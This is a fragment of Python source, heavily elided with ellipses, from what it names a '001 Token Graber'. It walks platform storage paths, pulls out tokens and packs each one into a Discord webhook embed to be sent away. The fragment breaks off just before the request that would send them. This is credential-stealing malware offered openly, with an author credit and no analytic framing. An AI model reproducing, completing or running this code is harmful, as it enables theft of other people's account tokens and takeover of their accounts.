...
def main():
	...
	for platform, path in PATHS.items():
		...
		for token in gettokens(path):
			...
			embed = {
				...
				"footer": {
					"text": "Created by 001 https://github.com/Kasra001-KH"
				}
			}
			embeds.append(embed)
	...
	webhook = {
		"content": "",
		"embeds": embeds,
		"username": "001 Token Graber",
		"avatar_url": "https://cdn.discordapp.com/attachments/886033170112323614/886530989982113792/wp5063431.jpg"
	}
	try:
